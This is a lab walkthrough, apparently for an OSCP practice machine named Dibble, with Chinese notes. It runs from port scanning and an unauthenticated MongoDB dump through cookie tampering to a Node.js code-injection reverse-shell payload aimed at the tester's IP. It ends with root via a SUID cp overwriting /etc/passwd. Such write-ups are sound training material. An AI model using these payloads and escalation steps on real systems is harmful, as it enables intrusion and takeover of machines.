```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Dibble]
└─$ sudo nmap -A -sC -T4 192.168.224.110
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-06 23:06 CST
Nmap scan report for 192.168.224.110
Host is up (0.28s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.45.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey:
|   3072 9d:3f:eb:1b:aa:9c:1e:b1:30:9b:23:53:4b:cf:59:75 (RSA)
|   256 cd:dc:05:e6:e3:bb:12:33:f7:09:74:50:12:8a:85:64 (ECDSA)
|_  256 a0:90:1f:50:78:b3:9e:41:2a:7f:5c:6f:4d:0e:a1:fa (ED25519)
80/tcp   open  http    Apache httpd 2.4.46 ((Fedora))
|_http-server-header: Apache/2.4.46 (Fedora)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/
| /user/password/ /user/login/ /user/logout/ /index.php/admin/
|_/index.php/comment/reply/
|_http-title: Home | Hacking Articles
|_http-generator: Drupal 9 (https://www.drupal.org)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   277.43 ms 192.168.45.1
2   277.22 ms 192.168.45.254
3   278.32 ms 192.168.251.1
4   278.86 ms 192.168.224.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.76 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Dibble]
└─$ nmap -p- -n -vvv 192.168.224.110
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-06 23:08 CST
Initiating Ping Scan at 23:08
Scanning 192.168.224.110 [2 ports]
Completed Ping Scan at 23:08, 0.29s elapsed (1 total hosts)
Initiating Connect Scan at 23:08
Scanning 192.168.224.110 [65535 ports]
Discovered open port 21/tcp on 192.168.224.110
Discovered open port 22/tcp on 192.168.224.110
Discovered open port 80/tcp on 192.168.224.110
Connect Scan Timing: About 4.41% done; ETC: 23:20 (0:11:11 remaining)
Connect Scan Timing: About 12.62% done; ETC: 23:16 (0:07:03 remaining)
Discovered open port 27017/tcp on 192.168.224.110
Connect Scan Timing: About 20.94% done; ETC: 23:16 (0:05:44 remaining)
Connect Scan Timing: About 28.30% done; ETC: 23:15 (0:05:07 remaining)
Connect Scan Timing: About 34.94% done; ETC: 23:17 (0:05:31 remaining)
Connect Scan Timing: About 35.13% done; ETC: 23:18 (0:06:24 remaining)
Stats: 0:03:46 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 38.97% done; ETC: 23:18 (0:05:54 remaining)
Connect Scan Timing: About 45.19% done; ETC: 23:18 (0:05:11 remaining)
Discovered open port 3000/tcp on 192.168.224.110
Connect Scan Timing: About 52.27% done; ETC: 23:18 (0:04:40 remaining)
Connect Scan Timing: About 58.89% done; ETC: 23:18 (0:03:55 remaining)
Connect Scan Timing: About 66.25% done; ETC: 23:18 (0:03:07 remaining)
Connect Scan Timing: About 75.30% done; ETC: 23:17 (0:02:10 remaining)
Connect Scan Timing: About 81.71% done; ETC: 23:17 (0:01:36 remaining)
Connect Scan Timing: About 89.33% done; ETC: 23:17 (0:00:55 remaining)
Completed Connect Scan at 23:17, 494.94s elapsed (65535 total ports)
Nmap scan report for 192.168.224.110
Host is up, received syn-ack (0.27s latency).
Scanned at 2023-09-06 23:08:47 CST for 495s
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
3000/tcp  open  ppp     syn-ack
27017/tcp open  mongod  syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 495.30 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Dibble]
└─$ sudo nmap -A -sC -T4 192.168.224.110 -p 21,22,80,3000,27017
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-06 23:26 CST
Nmap scan report for 192.168.224.110
Host is up (0.33s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.45.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey:
|   3072 9d:3f:eb:1b:aa:9c:1e:b1:30:9b:23:53:4b:cf:59:75 (RSA)
|   256 cd:dc:05:e6:e3:bb:12:33:f7:09:74:50:12:8a:85:64 (ECDSA)
|_  256 a0:90:1f:50:78:b3:9e:41:2a:7f:5c:6f:4d:0e:a1:fa (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))
|_http-server-header: Apache/2.4.46 (Fedora)
|_http-generator: Drupal 9 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/
| /user/password/ /user/login/ /user/logout/ /index.php/admin/
|_/index.php/comment/reply/
|_http-title: Home | Hacking Articles
3000/tcp  open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
27017/tcp open  mongodb MongoDB 4.2.9
|_mongodb-info: ERROR: Script execution failed (use -d to debug)
| mongodb-databases:
|   databases
|     3
|       sizeOnDisk = 73728.0
|       empty = false
|       name = local
|     2
|       sizeOnDisk = 110592.0
|       empty = false
|       name = config
|     1
|       sizeOnDisk = 40960.0
|       empty = false
|       name = admin
|     0
|       sizeOnDisk = 147456.0
|       empty = false
|       name = account-app
|   ok = 1.0
|_  totalSize = 372736.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   373.14 ms 192.168.45.1
2   373.11 ms 192.168.45.254
3   373.26 ms 192.168.251.1
4   373.28 ms 192.168.224.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.24 seconds
```

http://192.168.224.110/
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Dibble]
└─$ dirsearch -u http://192.168.224.110/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/ouyang/.dirsearch/reports/192.168.224.110/-_23-09-06_23-12-04.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-09-06_23-12-04.log

Target: http://192.168.224.110/

[23:12:05] Starting:
[23:12:20] 403 -  199B  - /.ht_wsr.txt
[23:12:21] 403 -  199B  - /.htaccess.bak1
[23:12:21] 403 -  199B  - /.htaccess.save
[23:12:21] 403 -  199B  - /.htaccess_sc
[23:12:21] 403 -  199B  - /.htaccess_orig
[23:12:21] 403 -  199B  - /.htaccess_extra
[23:12:21] 403 -  199B  - /.htaccessBAK
[23:12:21] 403 -  199B  - /.htaccess.orig
[23:12:21] 403 -  199B  - /.htaccess.sample
[23:12:21] 403 -  199B  - /.htaccessOLD
[23:12:21] 403 -  199B  - /.htpasswd_test
[23:12:21] 403 -  199B  - /.htaccessOLD2
[23:12:21] 403 -  199B  - /.html
[23:12:21] 403 -  199B  - /.httr-oauth
[23:12:21] 403 -  199B  - /.htpasswds
[23:12:21] 403 -  199B  - /.htm
[23:12:33] 403 -  199B  - /.user.ini
[23:12:39] 403 -    4KB - /ADMIN
[23:12:40] 403 -    4KB - /Admin
[23:12:44] 200 -   95B  - /INSTALL.txt
[23:12:45] 200 -   18KB - /LICENSE.txt
[23:12:47] 200 -    6KB - /README.txt
[23:12:47] 302 -  382B  - /Search  ->  http://192.168.224.110/search/node
[23:13:02] 403 -    4KB - /admin
[23:13:04] 403 -    4KB - /admin/
[23:13:04] 403 -    4KB - /admin/?/login
[23:13:06] 403 -    4KB - /admin/index
[23:13:40] 403 -  199B  - /cgi-bin/
[23:13:43] 200 -    3KB - /composer.json
[23:13:44] 200 -  154KB - /composer.lock
[23:13:47] 200 -    8KB - /contact
[23:13:47] 301 -  236B  - /core  ->  http://192.168.224.110/core/
[23:13:48] 403 -    4KB - /cron/cron.sh
[23:14:10] 200 -   13KB - /index.php
[23:14:26] 301 -  239B  - /modules  ->  http://192.168.224.110/modules/
[23:14:26] 200 -  677B  - /modules/
[23:14:30] 200 -   13KB - /node
[23:14:43] 301 -  240B  - /profiles  ->  http://192.168.224.110/profiles/
[23:14:48] 200 -    2KB - /robots.txt
[23:14:49] 302 -  382B  - /search  ->  http://192.168.224.110/search/node
[23:14:55] 301 -  237B  - /sites  ->  http://192.168.224.110/sites/
[23:14:55] 200 -    0B  - /sites/example.sites.php
[23:14:55] 200 -  515B  - /sites/README.txt
[23:15:03] 200 -    1KB - /themes/
[23:15:03] 301 -  238B  - /themes  ->  http://192.168.224.110/themes/
[23:15:08] 302 -  378B  - /user/  ->  http://192.168.224.110/user/login
[23:15:08] 403 -  157B  - /update.php
[23:15:08] 200 -    8KB - /user/login/
[23:15:08] 302 -  378B  - /user  ->  http://192.168.224.110/user/login
[23:15:11] 403 -  199B  - /vendor/
[23:15:11] 403 -  199B  - /vendor/composer/autoload_psr4.php
[23:15:11] 403 -  199B  - /vendor/composer/autoload_files.php
[23:15:11] 403 -  199B  - /vendor/composer/autoload_classmap.php
[23:15:11] 403 -  199B  - /vendor/composer/autoload_namespaces.php
[23:15:11] 403 -  199B  - /vendor/bundle
[23:15:11] 403 -  199B  - /vendor/assets/bower_components
[23:15:11] 403 -  199B  - /vendor/composer/LICENSE
[23:15:11] 403 -  199B  - /vendor/composer/installed.json
[23:15:11] 403 -  199B  - /vendor/composer/ClassLoader.php
[23:15:11] 403 -  199B  - /vendor/phpunit/src/Util/PHP/eval-stdin.php
[23:15:11] 403 -  199B  - /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[23:15:11] 403 -  199B  - /vendor/phpunit/Util/PHP/eval-stdin.php
[23:15:11] 403 -  199B  - /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
[23:15:11] 403 -  199B  - /vendor/composer/autoload_static.php
[23:15:11] 403 -  199B  - /vendor/autoload.php
[23:15:11] 403 -  199B  - /vendor/composer/autoload_real.php
[23:15:12] 200 -    4KB - /web.config
```

http://192.168.224.110:3000/

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Dibble]
└─$ dirsearch -u http://192.168.224.110:3000/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/ouyang/.dirsearch/reports/192.168.224.110-3000/-_23-09-06_23-16-15.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-09-06_23-16-15.log

Target: http://192.168.224.110:3000/

[23:16:16] Starting:
[23:16:41] 302 -   33B  - /Logs/  ->  /auth/login
[23:17:14] 200 -    1KB - /auth/login
[23:17:51] 302 -   33B  - /logs  ->  /auth/login
[23:17:51] 302 -   33B  - /logs/  ->  /auth/login
[23:18:27] 302 -   33B  - /users/  ->  /auth/login
[23:18:27] 302 -   33B  - /users  ->  /auth/login
[23:18:27] 200 -  638B  - /users/admin
[23:18:27] 200 -  638B  - /users/admin.php
[23:18:27] 200 -  638B  - /users/login.aspx
[23:18:27] 200 -  638B  - /users/login.php
[23:18:27] 200 -  638B  - /users/login
[23:18:27] 200 -  638B  - /users/login.jsp
[23:18:27] 200 -  638B  - /users/login.html
[23:18:27] 200 -  638B  - /users/login.js
```


nmap 發現 mongodb 不用驗證

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Dibble]
└─$ nmap -n -sV --script mongodb-brute -p 27017 192.168.224.110
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-06 23:28 CST
Nmap scan report for 192.168.224.110
Host is up (0.26s latency).

PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 4.2.9
|_mongodb-brute: No authentication needed

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```

	重連 VPN，IP 換成 192.168.234.110

```json
> show dbs
account-app  0.000GB
admin        0.000GB
config       0.000GB
local        0.000GB
> use account-app
switched to db account-app

> show collections
logmsg
users

> db.users.find()
{ "_id" : ObjectId("5f73c575eae85a15b8df908d"), "username" : "administrator", "password" : "ab6edb97f0c7a6455c57f94b7df73263e57113c85f38cd9b9470c8be8d6dd8ac", "facebook" : "NEVER!", "github" : "http://github.com/", "name" : "administrator", "twitter" : "https://twitter.com/sadserver" }
```

得到一組帳密 
```json
administrator / ab6edb97f0c7a6455c57f94b7df73263e57113c85f38cd9b9470c8be8d6dd8ac
```

但沒辦法破解

嘗試針對 port 3000 nodejs 服務破解

![[截圖 2023-09-07 下午7.35.50.png]]

但顯示需要 admin 才能新增 log event

發現通過 burp 可以把 userlevel 改成 admin，且可成功新增 log event，嘗試 command injection

![[截圖 2023-09-07 下午7.36.55.png]]

發現成功新增，且 js 有漏洞導致 3\*3 可成功執行

![[截圖 2023-09-07 下午7.37.54.png]]

[Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs) 嘗試回彈 reverse shell

```http
POST /logs/new HTTP/1.1
Host: 192.168.234.110:3000
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 413
Origin: http://192.168.234.110:3000
Connection: close
Referer: http://192.168.234.110:3000/logs
Cookie: connect.sid=s%3AXAcGkT1rjK62hI_ZrRorOaH8tqGGJZt-.AmYcU869BjnEo2w2yP9sQsszAJjzxtbDxrrAHHkouHE; userLevel=YWRtaW4%3d
Upgrade-Insecure-Requests: 1

username=test&msg=(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(3000, "192.168.45.222", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

![[截圖 2023-09-07 下午7.41.23.png]]

get shell!

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Dibble]
└─$ nc -nvlp 3000
listening on [any] 3000 ...
connect to [192.168.45.222] from (UNKNOWN) [192.168.234.110] 40814
whoami
benjamin
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.234.110  netmask 255.255.255.0  broadcast 192.168.234.255
        inet6 fe80::aee:fba:d6d3:b479  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ba:0c:fe  txqueuelen 1000  (Ethernet)
        RX packets 415  bytes 51321 (50.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 348  bytes 246472 (240.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1225  bytes 128312 (125.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1225  bytes 128312 (125.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### 提權

```json
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.9.2

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1


╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x. 1 root root 91K Mar 26  2020 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 41K Jan 28  2020 /usr/bin/fusermount
-rwsr-xr-x. 1 root root 156K Apr 23  2020 /usr/bin/cp
-rwsr-xr-x. 1 root root 41K May 20  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
---s--x--x. 1 root root 183K Sep 15  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x. 1 root root 82K Mar 26  2020 /usr/bin/chage
-rwsr-xr-x. 1 root root 58K May 20  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x. 1 root root 37K Jan 29  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x. 1 root root 74K May 20  2020 /usr/bin/su
-rwsr-xr-x. 1 root root 47K Mar 26  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x. 1 root root 16K Sep 15  2020 /usr/sbin/grub2-set-bootflag (Unknown SUID binary!)
-rwsr-xr-x. 1 root root 45K Jun 24  2020 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 16K Jun 24  2020 /usr/sbin/pam_timestamp_check


╔══════════╣ Unexpected in root
/.autorelabel


╔══════════╣ Searching passwords in config PHP files
 *     'password' => 'sqlpassword',
 *   'password' => 'sqlpassword',


╔══════════╣ Analyzing Mongo Files (limit 70)
Version: MongoDB shell version v4.2.9
git version: 06402114114ffc5146fd4b55402c96f1dc9ec4b5
OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013
allocator: tcmalloc
modules: none
build environment:
    distmod: rhel70
    distarch: x86_64
    target_arch: x86_64
db version v4.2.9
git version: 06402114114ffc5146fd4b55402c96f1dc9ec4b5
OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013
allocator: tcmalloc
modules: none
build environment:
    distmod: rhel70
    distarch: x86_64
    target_arch: x86_64
Possible mongo anonymous authentication
-rw-r--r--. 1 root root 830 Aug 19  2020 /etc/mongod.conf
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
storage:
  dbPath: /var/lib/mongo
  journal:
    enabled: true
processManagement:
  timeZoneInfo: /usr/share/zoneinfo
net:
  port: 27017
```

[CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)


發現 cp 有 SUID，嘗試利用 cp 覆蓋掉 /etc/passwd，[gtfobins](https://gtfobins.github.io/gtfobins/cp/)

```json
-rwsr-xr-x. 1 root root 156K Apr 23  2020 /usr/bin/cp
```

自己建立一個 password 用 openssl 轉成 hash 後放入 /etc/passwd

```json
[benjamin@dibble ~]$ openssl passwd password
openssl passwd password
l6m8HD0UETxVo
 
[benjamin@dibble ~]$ cat /etc/passwd > passwd.bak
cat /etc/passwd > passwd.bak

[benjamin@dibble ~]$ cat << EOF > passwd
cat << EOF > passwd
> root:x:0:0:root:/root:/bin/bash
root:x:0:0:root:/root:/bin/bash
> test:l6m8HD0UETxVo:0:0:root:/root:/bin/bash
test:l6m8HD0UETxVo:0:0:root:/root:/bin/bash
> EOF
EOF
[benjamin@dibble ~]$ cp passwd /etc/passwd
cp passwd /etc/passwd
[benjamin@dibble ~]$ su test
su test
Password: password

ls
app
file
file_to_write
linpeas.sh
local.txt
passwd
passwd.bak
whoami
root
```

成功提權！